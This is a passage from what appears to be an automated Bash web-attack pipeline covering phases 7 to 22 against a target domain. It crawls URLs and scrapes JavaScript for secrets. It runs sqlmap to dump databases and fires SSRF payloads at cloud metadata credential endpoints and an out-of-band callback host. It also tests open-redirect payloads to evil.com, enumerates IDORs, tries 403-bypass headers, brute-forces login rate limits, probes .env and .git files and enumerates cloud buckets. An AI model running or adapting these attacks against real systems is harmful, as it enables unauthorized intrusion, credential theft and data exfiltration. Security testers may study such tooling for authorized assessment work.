  local out="${base}/07_wayback"
  mkdir -p "$out"
  log_phase 7 25 "WAYBACK MINING"

  local pids=()

  # waybackurls
  if ensure_tool waybackurls 2>/dev/null; then
    log_info "waybackurls…"
    {
      echo "$target" | run_with_timeout 300 waybackurls 2>/dev/null | \
        sort -u > "${out}/waybackurls.txt"
    } &
    pids+=($!)
  fi

  # gau
  if ensure_tool gau 2>/dev/null; then
    log_info "gau…"
    {
      run_with_timeout 300 gau --subs "$target" 2>/dev/null | \
        sort -u > "${out}/gau.txt"
    } &
    pids+=($!)
  fi

  # katana crawl on live hosts
  if ensure_tool katana 2>/dev/null && [[ -s "${base}/live_hosts.txt" ]]; then
    log_info "katana crawl…"
    {
      run_with_timeout 600 katana \
        -l "${base}/live_hosts.txt" \
        -d 5 \
        -jc \
        -kf all \
        -o "${out}/katana.txt" \
        -silent 2>/dev/null
    } &
    pids+=($!)
  fi

  for pid in "${pids[@]}"; do
    wait "$pid" 2>/dev/null || true
  done

  # Merge all URLs
  cat "${out}"/*.txt 2>/dev/null | sort -u > "${base}/all_urls.txt"

  # Extract params
  grep -oP '[?&][^=&]+=' "${base}/all_urls.txt" 2>/dev/null | \
    sort -u > "${base}/all_params.txt" || true

  # Extract unique endpoints (strip params)
  sed 's/[?#].*//' "${base}/all_urls.txt" 2>/dev/null | sort -u > "${base}/all_endpoints.txt" || true

  local url_count param_count
  url_count="$(count_lines "${base}/all_urls.txt")"
  param_count="$(count_lines "${base}/all_params.txt")"
  log_ok "Phase 7 complete — ${url_count} URLs, ${param_count} param patterns found."
}

_phase_js_analysis() {
  local target="$1" base="$2"
  local out="${base}/08_javascript"
  mkdir -p "$out"
  log_phase 8 25 "JAVASCRIPT ANALYSIS"

  # Extract JS URLs from discovered URLs
  grep -iE '\.js(\?|$)' "${base}/all_urls.txt" 2>/dev/null | sort -u > "${out}/js_urls.txt" || true

  local js_count
  js_count="$(count_lines "${out}/js_urls.txt")"
  log_info "Analysing ${js_count} JS files…"

  [[ "$js_count" -eq 0 ]] && { log_warn "No JS files found."; return; }

  # getJS
  if ensure_tool getJS 2>/dev/null && [[ -s "${base}/live_hosts.txt" ]]; then
    log_info "getJS link extraction…"
    while IFS= read -r host; do
      [[ -z "$host" ]] && continue
      run_with_timeout 60 getJS --url "$host" --output "${out}/getjs_${host//[:\/]/_}.txt" 2>/dev/null || true
    done < "${base}/live_hosts.txt"
  fi

  # LinkFinder patterns via regex on downloaded JS
  log_info "LinkFinder pattern extraction…"
  mkdir -p "${out}/js_content"
  local count=0
  while IFS= read -r jsurl; do
    [[ -z "$jsurl" ]] && continue
    (( count++ ))
    [[ $count -gt 200 ]] && break
    local fname
    fname="${out}/js_content/$(echo "$jsurl" | md5sum | cut -c1-8).js"
    curl -fsSL --max-time 20 "$jsurl" -o "$fname" 2>/dev/null || true
  done < "${out}/js_urls.txt"

  # Secret patterns
  log_info "Scanning JS for secrets…"
  {
    grep -rEi \
      '(api[_-]?key|apikey|api[_-]?secret|aws_access|aws_secret|password|passwd|secret[_-]?key|token|bearer|authorization|private[_-]?key|client[_-]?secret|oauth|credential|auth[_-]?token)[\s]*[=:]["'"'"'][A-Za-z0-9+/=_\-]{10,}' \
      "${out}/js_content/" 2>/dev/null | tee "${out}/secrets_regex.txt" | \
      while IFS= read -r line; do
        append_finding "${base}/findings.txt" "HIGH" "JS_SECRET" "${line:0:200}"
      done
  } || true

  # trufflehog on JS dir
  if ensure_tool trufflehog 2>/dev/null; then
    log_info "trufflehog JS analysis…"
    run_with_timeout 300 trufflehog filesystem "${out}/js_content/" \
      --json 2>/dev/null | tee "${out}/trufflehog_js.txt" | \
      grep -oP '"Raw":"\K[^"]{20,}' | head -50 | \
      while IFS= read -r secret; do
        append_finding "${base}/findings.txt" "CRITICAL" "TRUFFLEHOG_SECRET" "$secret"
      done || true
  fi

  log_ok "Phase 8 complete. JS analysis done. Check: ${out}/"
}

_phase_param_discovery() {
  local target="$1" base="$2"
  local out="${base}/09_params"
  mkdir -p "$out"
  log_phase 9 25 "PARAMETER DISCOVERY"

  ensure_tool arjun 2>/dev/null || { log_warn "arjun not found. Skipping param discovery."; return; }

  [[ ! -s "${base}/all_endpoints.txt" ]] && { log_warn "No endpoints for param discovery."; return; }

  # Sample top 50 endpoints to avoid overload
  head -50 "${base}/all_endpoints.txt" > "${out}/endpoints_sample.txt"

  log_info "arjun parameter discovery on $(count_lines "${out}/endpoints_sample.txt") endpoints…"
  run_with_timeout 600 arjun \
    -i "${out}/endpoints_sample.txt" \
    -oJ "${out}/arjun_params.json" \
    -t 10 \
    -q 2>/dev/null || true

  # Build parameterised URL list
  if tool_exists jq && [[ -s "${out}/arjun_params.json" ]]; then
    jq -r 'to_entries[] | .key as $url | .value[] | "\($url)?\(.)=FUZZ"' \
      "${out}/arjun_params.json" 2>/dev/null > "${out}/parameterised_urls.txt" || true
  fi

  log_ok "Phase 9 complete. Param discovery done: ${out}/"
}

_phase_nuclei_scan() {
  local target="$1" base="$2"
  local out="${base}/10_nuclei"
  mkdir -p "$out"
  log_phase 10 25 "NUCLEI SCAN"

  ensure_tool nuclei 2>/dev/null || { log_warn "nuclei not found. Skipping."; return; }

  local input="${base}/live_hosts.txt"
  [[ ! -s "$input" ]] && { log_warn "No live hosts for nuclei."; return; }

  log_info "Nuclei — critical/high/medium + CVE + misconfig…"
  run_with_timeout 1800 nuclei \
    -l "$input" \
    -severity critical,high,medium \
    -tags cve,misconfig,exposure,rce,sqli,xss,ssrf,takeover,tech \
    -o "${out}/nuclei_main.txt" \
    -stats \
    -bulk-size 25 \
    -concurrency 10 \
    -rate-limit 100 \
    -silent 2>/dev/null || true

  log_info "Nuclei — low/info exposures…"
  run_with_timeout 600 nuclei \
    -l "$input" \
    -severity low,info \
    -tags exposure,token,files \
    -o "${out}/nuclei_low.txt" \
    -bulk-size 20 \
    -concurrency 5 \
    -rate-limit 50 \
    -silent 2>/dev/null || true

  # Feed findings
  grep -E "\[critical\]|\[high\]" "${out}/nuclei_main.txt" 2>/dev/null | \
    while IFS= read -r line; do
      local sev="HIGH"
      echo "$line" | grep -qi "critical" && sev="CRITICAL"
      append_finding "${base}/findings.txt" "$sev" "NUCLEI" "${line:0:300}"
    done || true

  local count
  count="$(count_lines "${out}/nuclei_main.txt")"
  log_ok "Phase 10 complete — ${count} nuclei findings."
}

_phase_xss_hunting() {
  local target="$1" base="$2"
  local out="${base}/11_xss"
  mkdir -p "$out"
  log_phase 11 25 "XSS HUNTING"

  local param_urls="${base}/09_params/parameterised_urls.txt"
  local all_urls="${base}/all_urls.txt"

  # GF XSS patterns
  if ensure_tool gf 2>/dev/null && [[ -s "$all_urls" ]]; then
    log_info "GF XSS pattern filtering…"
    gf xss < "$all_urls" 2>/dev/null | sort -u > "${out}/gf_xss_urls.txt" || true
  fi

  local xss_input="${out}/gf_xss_urls.txt"
  [[ ! -s "$xss_input" ]] && xss_input="$param_urls"
  [[ ! -s "$xss_input" ]] && { log_warn "No XSS targets. Skipping dalfox."; return; }

  if ensure_tool dalfox 2>/dev/null; then
    log_info "dalfox on $(count_lines "$xss_input") URLs…"
    run_with_timeout 900 dalfox file "$xss_input" \
      --skip-bav \
      --no-spinner \
      --format json \
      -o "${out}/dalfox_results.json" 2>/dev/null || true

    # Also pipe mode for quick scan
    head -20 "$xss_input" | \
      run_with_timeout 300 dalfox pipe \
        --skip-bav \
        --no-spinner \
        -o "${out}/dalfox_pipe.txt" 2>/dev/null || true

    grep -i "vulnerable\|[VULN]" "${out}/dalfox_results.json" "${out}/dalfox_pipe.txt" 2>/dev/null | \
      while IFS= read -r line; do
        append_finding "${base}/findings.txt" "HIGH" "XSS" "${line:0:300}"
      done || true
  fi

  local count
  count="$(count_lines "${out}/dalfox_pipe.txt")"
  log_ok "Phase 11 complete — XSS hunting done. Results: ${out}/"
}

_phase_sqli_hunting() {
  local target="$1" base="$2"
  local out="${base}/12_sqli"
  mkdir -p "$out"
  log_phase 12 25 "SQL INJECTION"

  # GF SQLi patterns
  local all_urls="${base}/all_urls.txt"
  if ensure_tool gf 2>/dev/null && [[ -s "$all_urls" ]]; then
    log_info "GF SQLi pattern filtering…"
    gf sqli < "$all_urls" 2>/dev/null | sort -u > "${out}/gf_sqli_urls.txt" || true
  fi

  local sqli_input="${out}/gf_sqli_urls.txt"
  [[ ! -s "$sqli_input" ]] && { log_warn "No SQLi targets found. Skipping sqlmap."; return; }

  ensure_tool sqlmap 2>/dev/null || { log_warn "sqlmap not found. Skipping."; return; }

  log_info "sqlmap on top SQLi candidates…"
  local count=0
  while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    (( count++ ))
    [[ $count -gt 20 ]] && break
    log_info "sqlmap: $url"
    run_with_timeout 180 sqlmap \
      -u "$url" \
      --batch \
      --level=2 \
      --risk=2 \
      --random-agent \
      --output-dir="${out}/sqlmap_$(echo "$url" | md5sum | cut -c1-8)" \
      --forms \
      --dbs \
      --answers="quit=N" \
      -q 2>/dev/null || true
    # Check for success
    if grep -rl "is vulnerable" "${out}/sqlmap_"* 2>/dev/null | grep -q .; then
      append_finding "${base}/findings.txt" "CRITICAL" "SQLI" "SQLi found: $url"
    fi
  done < "$sqli_input"

  log_ok "Phase 12 complete — SQLi hunting done. Results: ${out}/"
}

_phase_ssrf_hunting() {
  local target="$1" base="$2"
  local out="${base}/13_ssrf"
  mkdir -p "$out"
  log_phase 13 25 "SSRF HUNTING"

  local all_urls="${base}/all_urls.txt"
  local pids=()

  # Get interactsh payload
  local oast_url="http://${INTERACTSH_SERVER}/devil-ssrf-$(echo "$target" | md5sum | cut -c1-8)"

  # GF SSRF patterns
  if ensure_tool gf 2>/dev/null && [[ -s "$all_urls" ]]; then
    log_info "GF SSRF pattern filtering…"
    gf ssrf < "$all_urls" 2>/dev/null | sort -u > "${out}/gf_ssrf_urls.txt" || true
  fi

  local ssrf_urls="${out}/gf_ssrf_urls.txt"
  [[ ! -s "$ssrf_urls" ]] && ssrf_urls="$all_urls"
  [[ ! -s "$ssrf_urls" ]] && { log_warn "No SSRF targets. Skipping."; return; }

  # SSRF payloads
  local -a SSRF_PAYLOADS=(
    "http://169.254.169.254/latest/meta-data/"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://metadata.google.internal/computeMetadata/v1/"
    "http://100.100.100.200/latest/meta-data/"
    "$oast_url"
    "http://127.0.0.1:80/"
    "http://[::1]:80/"
    "http://0.0.0.0:22/"
    "http://localhost/"
  )

  log_info "Testing SSRF with custom payloads on $(count_lines "$ssrf_urls") URLs…"
  local count=0
  while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    (( count++ ))
    [[ $count -gt 100 ]] && break

    for payload in "${SSRF_PAYLOADS[@]}"; do
      local test_url
      test_url="$(echo "$url" | sed "s|=\([^&]*\)|=${payload}|1")"
      local response
      response="$(run_with_timeout 10 curl -fsSL -m 8 --max-redirs 3 "$test_url" 2>/dev/null | head -c 500 || true)"
      if echo "$response" | grep -qiE "ami-id|instance-id|security-credentials|computeMetadata|root:x:0"; then
        log_ok "SSRF FOUND: $test_url → $payload"
        append_finding "${base}/findings.txt" "CRITICAL" "SSRF" "SSRF confirmed: $test_url → payload: $payload"
        echo "SSRF: $test_url → $payload" >> "${out}/ssrf_confirmed.txt"
      fi
    done &
    pids+=($!)

    # Throttle parallelism
    if [[ ${#pids[@]} -ge 20 ]]; then
      wait "${pids[@]}" 2>/dev/null || true
      pids=()
    fi
  done < "$ssrf_urls"

  wait "${pids[@]}" 2>/dev/null || true

  # interactsh-client if available
  if ensure_tool interactsh-client 2>/dev/null; then
    log_info "interactsh-client polling for OOB callbacks…"
    run_with_timeout 60 interactsh-client \
      -s "${INTERACTSH_SERVER}" \
      -o "${out}/interactsh_hits.txt" \
      -n 1 \
      -nc 2>/dev/null || true
  fi

  log_ok "Phase 13 complete — SSRF hunting done. Results: ${out}/"
}

_phase_open_redirect() {
  local target="$1" base="$2"
  local out="${base}/14_open_redirect"
  mkdir -p "$out"
  log_phase 14 25 "OPEN REDIRECT"

  local all_urls="${base}/all_urls.txt"

  # GF redirect patterns
  if ensure_tool gf 2>/dev/null && [[ -s "$all_urls" ]]; then
    log_info "GF redirect pattern filtering…"
    gf redirect < "$all_urls" 2>/dev/null | sort -u > "${out}/gf_redirect_urls.txt" || true
  fi

  local redirect_urls="${out}/gf_redirect_urls.txt"
  [[ ! -s "$redirect_urls" ]] && { log_warn "No redirect targets. Skipping."; return; }

  local -a REDIRECT_PAYLOADS=(
    "https://evil.com"
    "//evil.com"
    "https:evil.com"
    "///evil.com"
    "/\\evil.com"
    "https://evil.com%2F@${target}"
    "https://${target}.evil.com"
    "%0a%0dhttps://evil.com"
  )

  log_info "Testing open redirects on $(count_lines "$redirect_urls") URLs…"
  local count=0
  while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    (( count++ ))
    [[ $count -gt 200 ]] && break
    for payload in "${REDIRECT_PAYLOADS[@]}"; do
      local test_url
      test_url="$(echo "$url" | sed "s|=\([^&]*\)|=${payload}|1")"
      local location
      location="$(run_with_timeout 10 curl -fsSI -m 8 --max-redirs 0 "$test_url" 2>/dev/null | \
        grep -i "^location:" | tr -d '\r' | cut -d' ' -f2 || true)"
      if echo "$location" | grep -qi "evil\.com"; then
        log_ok "Open Redirect: $test_url → $location"
        append_finding "${base}/findings.txt" "MEDIUM" "OPEN_REDIRECT" "Redirect: $test_url → $location"
        echo "$test_url → $location" >> "${out}/confirmed_redirects.txt"
      fi
    done
  done < "$redirect_urls"

  log_ok "Phase 14 complete — Open redirect hunting done."
}

_phase_idor_hunting() {
  local target="$1" base="$2"
  local out="${base}/15_idor"
  mkdir -p "$out"
  log_phase 15 25 "IDOR HUNTING"

  local all_urls="${base}/all_urls.txt"
  [[ ! -s "$all_urls" ]] && { log_warn "No URLs for IDOR. Skipping."; return; }

  log_info "Finding numeric/UUID params for IDOR testing…"
  grep -oP '[?&](id|user_id|account_id|order_id|file_id|profile_id|uid|pid|cid|oid|doc_id|item_id)=\d+' \
    "$all_urls" 2>/dev/null | sort -u > "${out}/numeric_params.txt" || true

  grep -oP '[?&][a-z_]+=\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b' \
    "$all_urls" 2>/dev/null | sort -u >> "${out}/numeric_params.txt" || true

  local param_count
  param_count="$(count_lines "${out}/numeric_params.txt")"
  [[ "$param_count" -eq 0 ]] && { log_warn "No numeric/UUID params found. Skipping."; return; }

  log_info "IDOR enumeration on ${param_count} param patterns…"
  local count=0
  while IFS= read -r param_pattern; do
    [[ -z "$param_pattern" ]] && continue
    (( count++ ))
    [[ $count -gt 50 ]] && break

    # Extract base URL and param from pattern
    local base_url param_name orig_val
    base_url="$(grep "$param_pattern" "$all_urls" | head -1 | sed 's/[?#].*//')"
    param_name="$(echo "$param_pattern" | grep -oP '[?&]\K[^=]+')"
    orig_val="$(echo "$param_pattern" | grep -oP '=\K.*')"

    [[ -z "$base_url" || -z "$param_name" ]] && continue

    # Test adjacent IDs
    for delta in -5 -1 1 2 5 100 9999; do
      local test_val=$(( orig_val + delta )) 2>/dev/null || continue
      [[ $test_val -lt 1 ]] && continue
      local test_url="${base_url}?${param_name}=${test_val}"
      local code
      code="$(run_with_timeout 10 curl -o /dev/null -s -w "%{http_code}" -m 8 "$test_url" 2>/dev/null || echo 0)"
      if [[ "$code" =~ ^2 ]]; then
        log_ok "Potential IDOR: ${test_url} (HTTP ${code})"
        append_finding "${base}/findings.txt" "HIGH" "IDOR" "Potential IDOR: ${test_url} HTTP ${code}"
        echo "IDOR: $test_url HTTP $code" >> "${out}/idor_candidates.txt"
      fi
    done
  done < "${out}/numeric_params.txt"

  log_ok "Phase 15 complete — IDOR hunting done. Results: ${out}/"
}

_phase_auth_bypass() {
  local target="$1" base="$2"
  local out="${base}/16_auth_bypass"
  mkdir -p "$out"
  log_phase 16 25 "AUTH BYPASS"

  local -a BYPASS_PATHS=(
    "/admin" "/admin/" "/administrator" "/admin/login"
    "/api/admin" "/api/v1/admin" "/api/internal"
    "/.env" "/.git/config" "/.git/HEAD"
    "/backup" "/backup.zip" "/backup.tar.gz" "/backup.sql"
    "/config.php" "/config.yml" "/config.json"
    "/debug" "/debug/pprof" "/debug/vars"
    "/actuator" "/actuator/health" "/actuator/env" "/actuator/beans"
    "/metrics" "/health" "/status" "/info"
    "/phpinfo.php" "/server-status" "/server-info"
    "/wp-admin" "/wp-config.php" "/xmlrpc.php"
    "/graphql" "/graphiql" "/api/graphql"
    "/.htaccess" "/.htpasswd"
    "/swagger.json" "/swagger.yaml" "/openapi.json" "/api-docs"
    "/robots.txt" "/sitemap.xml" "/crossdomain.xml"
    "/console" "/h2-console" "/shell"
    "/__debug__" "/__admin__"
  )

  local -a BYPASS_HEADERS=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Real-IP: 127.0.0.1"
    "X-Originating-IP: 127.0.0.1"
    "X-Remote-IP: 127.0.0.1"
    "X-Client-IP: 127.0.0.1"
    "X-Host: localhost"
    "X-Custom-IP-Authorization: 127.0.0.1"
  )

  log_info "Probing sensitive paths across live hosts…"
  local input="${base}/live_hosts.txt"
  [[ ! -s "$input" ]] && { log_warn "No live hosts. Skipping auth bypass."; return; }

  while IFS= read -r host; do
    [[ -z "$host" ]] && continue
    for path in "${BYPASS_PATHS[@]}"; do
      local url="${host%/}${path}"
      local code
      code="$(run_with_timeout 10 curl -o /dev/null -s -w "%{http_code}" -m 8 "$url" 2>/dev/null || echo 0)"
      if [[ "$code" == "200" || "$code" == "201" || "$code" == "204" ]]; then
        log_ok "Auth bypass / exposure: ${url} (HTTP ${code})"
        append_finding "${base}/findings.txt" "HIGH" "AUTH_BYPASS" "Exposed: ${url} HTTP ${code}"
        echo "EXPOSED: $url HTTP $code" >> "${out}/exposed_paths.txt"
      elif [[ "$code" == "403" ]]; then
        # Try header bypass
        for header in "${BYPASS_HEADERS[@]}"; do
          local bypass_code
          bypass_code="$(run_with_timeout 10 curl -o /dev/null -s -w "%{http_code}" -m 8 \
            -H "$header" "$url" 2>/dev/null || echo 0)"
          if [[ "$bypass_code" == "200" ]]; then
            log_ok "403 bypass: ${url} with header ${header}"
            append_finding "${base}/findings.txt" "HIGH" "AUTH_BYPASS" "403 bypass: $url with $header"
            echo "403_BYPASS: $url → $header" >> "${out}/exposed_paths.txt"
          fi
        done
      fi
    done
  done < "$input"

  log_ok "Phase 16 complete — Auth bypass done. Results: ${out}/"
}

_phase_secret_scanning() {
  local target="$1" base="$2"
  local out="${base}/17_secrets"
  mkdir -p "$out"
  log_phase 17 25 "SECRET SCANNING"

  # trufflehog on all downloaded content
  if ensure_tool trufflehog 2>/dev/null; then
    log_info "trufflehog — full findings dir scan…"
    run_with_timeout 600 trufflehog filesystem "$base" \
      --json \
      --exclude-paths "${out}" \
      2>/dev/null | tee "${out}/trufflehog_full.json" | \
      grep -oP '"Raw":"\K[^"]{15,}' | \
      while IFS= read -r secret; do
        append_finding "${base}/findings.txt" "CRITICAL" "SECRET_LEAK" "trufflehog: ${secret:0:100}"
      done || true
  fi

  # gitleaks on discovered git repos
  if ensure_tool gitleaks 2>/dev/null; then
    log_info "gitleaks — scanning for .git exposures…"
    if [[ -s "${out}/../16_auth_bypass/exposed_paths.txt" ]]; then
      grep "\.git" "${out}/../16_auth_bypass/exposed_paths.txt" 2>/dev/null | \
        grep -oP 'https?://[^\s]+' | \
        while IFS= read -r git_url; do
          local repo_dir
          repo_dir="$(mktemp -d /tmp/devil_repo_XXXXXX)"
          git clone --quiet "$git_url" "$repo_dir" 2>/dev/null || true
          if [[ -d "${repo_dir}/.git" ]]; then
            run_with_timeout 120 gitleaks detect \
              --source "$repo_dir" \
              --report-path "${out}/gitleaks_$(basename "$repo_dir").json" \
              --no-banner \
              -q 2>/dev/null || true
          fi
          rm -rf "$repo_dir"
        done || true
    fi
  fi

  log_ok "Phase 17 complete — Secret scanning done. Results: ${out}/"
}

_phase_vuln_chain_analysis() {
  local target="$1" base="$2"
  local out="${base}/18_chains"
  mkdir -p "$out"
  log_phase 18 25 "VULNERABILITY CHAIN ANALYSIS"

  local findings="${base}/findings.txt"
  [[ ! -s "$findings" ]] && { log_warn "No findings yet for chain analysis."; return; }

  log_info "Correlating findings for exploit chains…"

  {
    printf "# Exploit Chain Analysis — %s\n\n" "$target"
    printf "Generated: %s\n\n" "$(ts)"

    declare -A vuln_present=()
    while IFS= read -r line; do
      for vtype in XSS SQLI SSRF IDOR OPEN_REDIRECT AUTH_BYPASS SECRET_LEAK \
                   NUCLEI JS_SECRET TRUFFLEHOG_SECRET; do
        if echo "$line" | grep -qi "$vtype"; then
          vuln_present[$vtype]=1
        fi
      done
    done < "$findings"

    printf "## Detected Vulnerability Classes\n\n"
    for v in "${!vuln_present[@]}"; do
      printf "- %s\n" "$v"
    done
    printf "\n"

    printf "## Potential Chains\n\n"

    [[ "${vuln_present[SSRF]:-}" && "${vuln_present[SECRET_LEAK]:-}" ]] && \
      printf "⚡ **SSRF + Secret Leak**: SSRF to cloud metadata → harvest IAM credentials → full cloud takeover\n\n"

    [[ "${vuln_present[XSS]:-}" && "${vuln_present[IDOR]:-}" ]] && \
      printf "⚡ **XSS + IDOR**: Stored XSS to steal session → use session for IDOR enumeration → mass data exfil\n\n"

    [[ "${vuln_present[SQLI]:-}" && "${vuln_present[AUTH_BYPASS]:-}" ]] && \
      printf "⚡ **SQLi + Auth Bypass**: SQLi to dump creds → auth bypass with extracted credentials → admin access\n\n"

    [[ "${vuln_present[OPEN_REDIRECT]:-}" && "${vuln_present[XSS]:-}" ]] && \
      printf "⚡ **Open Redirect + XSS**: Open redirect as OAuth redirect_uri → XSS token steal → account takeover\n\n"

    [[ "${vuln_present[AUTH_BYPASS]:-}" && "${vuln_present[IDOR]:-}" ]] && \
      printf "⚡ **Auth Bypass + IDOR**: Bypass auth → access objects without ownership check → full data compromise\n\n"

    [[ "${vuln_present[TRUFFLEHOG_SECRET]:-}" || "${vuln_present[JS_SECRET]:-}" ]] && \
      printf "⚡ **Secret in Code**: Hardcoded keys found → direct API/cloud/DB access → critical data exposure\n\n"

    printf "## Raw Finding Counts\n\n"
    printf "| Severity | Count |\n|----------|-------|\n"
    for sev in CRITICAL HIGH MEDIUM LOW INFO; do
      local c
      c="$(grep -ci "\[$sev\]" "$findings" 2>/dev/null || echo 0)"
      printf "| %s | %s |\n" "$sev" "$c"
    done
  } > "${out}/chain_analysis.md"

  log_ok "Phase 18 complete. Chain analysis: ${out}/chain_analysis.md"
}

_phase_rate_limit() {
  local target="$1" base="$2"
  local out="${base}/19_rate_limit"
  mkdir -p "$out"
  log_phase 19 25 "RATE LIMIT TESTING"

  local live="${base}/live_hosts.txt"
  [[ ! -s "$live" ]] && { log_warn "No live hosts. Skipping."; return; }

  local -a AUTH_ENDPOINTS=(
    "/login" "/signin" "/auth/login" "/api/login" "/api/v1/login"
    "/forgot-password" "/reset-password" "/api/auth" "/oauth/token"
    "/register" "/signup" "/api/register" "/api/v1/register"
    "/api/v1/auth/login" "/api/v2/auth/login"
    "/user/login" "/account/login" "/member/login"
  )

  log_info "Rate limit testing on auth endpoints…"
  while IFS= read -r host; do
    [[ -z "$host" ]] && continue
    for ep in "${AUTH_ENDPOINTS[@]}"; do
      local url="${host%/}${ep}"
      # Check if endpoint exists
      local code
      code="$(run_with_timeout 10 curl -o /dev/null -s -w "%{http_code}" -m 5 \
        -X POST "$url" -d "username=test&password=test" 2>/dev/null || echo 0)"
      [[ "$code" -lt 200 || "$code" -gt 405 ]] && continue

      log_info "Firing 30 rapid requests to: $url"
      local block=0
      for i in $(seq 1 30); do
        local rcode
        rcode="$(run_with_timeout 5 curl -o /dev/null -s -w "%{http_code}" -m 3 \
          -X POST "$url" \
          -d "username=testuser${i}&password=WrongPass${i}!" \
          -H "Content-Type: application/x-www-form-urlencoded" \
          2>/dev/null || echo 0)"
        if [[ "$rcode" == "429" || "$rcode" == "503" ]]; then
          block=1
          break
        fi
      done

      if [[ $block -eq 0 ]]; then
        log_ok "No rate limit: $url"
        append_finding "${base}/findings.txt" "MEDIUM" "RATE_LIMIT" "No rate limit on: $url"
        echo "NO_RATE_LIMIT: $url" >> "${out}/no_rate_limit.txt"
      fi
    done
  done < "$live"

  log_ok "Phase 19 complete. Rate limit results: ${out}/"
}

_phase_business_logic() {
  local target="$1" base="$2"
  local out="${base}/20_business_logic"
  mkdir -p "$out"
  log_phase 20 25 "BUSINESS LOGIC"

  local all_urls="${base}/all_urls.txt"
  [[ ! -s "$all_urls" ]] && { log_warn "No URLs for business logic. Skipping."; return; }

  log_info "Business logic — price/qty manipulation…"

  # Find URLs with price/quantity-like params
  grep -iE '[?&](price|amount|qty|quantity|total|cost|value|count|num|number)=' \
    "$all_urls" 2>/dev/null | sort -u | head -50 > "${out}/commerce_urls.txt" || true

  local -a BL_PAYLOADS=("-1" "0" "-0.01" "0.001" "99999999" "-99999999" "1e9" "NaN" "null" "undefined")

  while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    local param
    param="$(echo "$url" | grep -oP '[?&](price|amount|qty|quantity|total|cost|value)=\K[^&]+')"
    [[ -z "$param" ]] && continue
    for payload in "${BL_PAYLOADS[@]}"; do
      local test_url
      test_url="$(echo "$url" | sed "s/=${param}/=${payload}/")"
      local code
      code="$(run_with_timeout 10 curl -o /dev/null -s -w "%{http_code}" -m 8 "$test_url" 2>/dev/null || echo 0)"
      if [[ "$code" =~ ^2 ]]; then
        log_ok "Business logic candidate: ${test_url} (HTTP ${code})"
        append_finding "${base}/findings.txt" "HIGH" "BUSINESS_LOGIC" "BL: $test_url HTTP $code"
        echo "BL: $test_url HTTP $code" >> "${out}/bl_candidates.txt"
      fi
    done
  done < "${out}/commerce_urls.txt"

  log_ok "Phase 20 complete — Business logic done. Results: ${out}/"
}

_phase_cloud_checks() {
  local target="$1" base="$2"
  local out="${base}/21_cloud"
  mkdir -p "$out"
  log_phase 21 25 "CLOUD CHECKS"

  log_info "S3 bucket enumeration…"

  # Generate bucket name candidates
  local domain_clean
  domain_clean="$(echo "$target" | sed 's/\..*//')"
  local -a BUCKET_PATTERNS=(
    "$target"
    "$domain_clean"
    "${domain_clean}-prod"
    "${domain_clean}-dev"
    "${domain_clean}-stage"
    "${domain_clean}-staging"
    "${domain_clean}-backup"
    "${domain_clean}-assets"
    "${domain_clean}-media"
    "${domain_clean}-static"
    "${domain_clean}-data"
    "${domain_clean}-uploads"
    "${domain_clean}-files"
    "www-${domain_clean}"
    "api-${domain_clean}"
    "cdn-${domain_clean}"
    "${domain_clean}-cdn"
    "${domain_clean}-logs"
    "${domain_clean}-config"
    "${domain_clean}-secrets"
  )

  for bucket in "${BUCKET_PATTERNS[@]}"; do
    local pids=()
    # AWS S3
    {
      local code
      code="$(run_with_timeout 10 curl -o "${out}/s3_${bucket//[^a-z0-9_-]/_}.html" -s -w "%{http_code}" \
        -m 8 "https://${bucket}.s3.amazonaws.com" 2>/dev/null || echo 0)"
      if [[ "$code" == "200" ]]; then
        log_ok "S3 open: https://${bucket}.s3.amazonaws.com"
        append_finding "${base}/findings.txt" "CRITICAL" "CLOUD_S3" "Open S3: https://${bucket}.s3.amazonaws.com"
      elif [[ "$code" == "403" ]]; then
        log_info "S3 exists (403): ${bucket}"
        append_finding "${base}/findings.txt" "LOW" "CLOUD_S3" "S3 exists (403): ${bucket}"
      fi
    } &
    pids+=($!)

    # Azure Blob
    {
      local az_code
      az_code="$(run_with_timeout 10 curl -o /dev/null -s -w "%{http_code}" \
        -m 8 "https://${bucket}.blob.core.windows.net" 2>/dev/null || echo 0)"
      if [[ "$az_code" == "200" || "$az_code" == "400" ]]; then
        log_ok "Azure Blob exists: https://${bucket}.blob.core.windows.net"
        append_finding "${base}/findings.txt" "HIGH" "CLOUD_AZURE" "Azure Blob: https://${bucket}.blob.core.windows.net"
      fi
    } &
    pids+=($!)

    # GCP Storage
    {
      local gcp_code
      gcp_code="$(run_with_timeout 10 curl -o /dev/null -s -w "%{http_code}" \
        -m 8 "https://storage.googleapis.com/${bucket}" 2>/dev/null || echo 0)"
      if [[ "$gcp_code" == "200" ]]; then
        log_ok "GCP Storage open: https://storage.googleapis.com/${bucket}"
        append_finding "${base}/findings.txt" "CRITICAL" "CLOUD_GCP" "Open GCP: https://storage.googleapis.com/${bucket}"
      fi
    } &
    pids+=($!)

    wait "${pids[@]}" 2>/dev/null || true
  done

  log_ok "Phase 21 complete — Cloud checks done. Results: ${out}/"
}

_phase_api_discovery() {
  local target="$1" base="$2"
  local out="${base}/22_api"
  mkdir -p "$out"
  log_phase 22 25 "API DISCOVERY"

  local live="${base}/live_hosts.txt"
  [[ ! -s "$live" ]] && { log_warn "No live hosts. Skipping API discovery."; return; }

  local -a API_PATHS=(
    "/swagger.json" "/swagger.yaml" "/swagger-ui.html"
    "/api-docs" "/api-docs.json" "/api/docs"
    "/openapi.json" "/openapi.yaml"
    "/graphql" "/graphiql" "/graphql/console"
    "/api/graphql" "/api/v1/graphql"
    "/__graphql" "/v1/graphql"
    "/api/swagger.json" "/api/v1/swagger.json"
    "/api/v2/swagger.json" "/api/v3/swagger.json"
    "/api" "/api/v1" "/api/v2" "/api/v3"
    "/rest" "/rest/v1" "/rest/v2"
    "/.well-known/openapi"
  )

  local -a GRAPHQL_INTROSPECTION=(
    '{"query":"{__schema{types{name}}}"}'
    '{"query":"query IntrospectionQuery { __schema { queryType { name } } }"}'
  )

  while IFS= read -r host; do
    [[ -z "$host" ]] && continue
    for path in "${API_PATHS[@]}"; do
      local url="${host%/}${path}"
      local code content
      content="$(run_with_timeout 10 curl -fsSL -m 8 "$url" 2>/dev/null | head -c 2000 || true)"
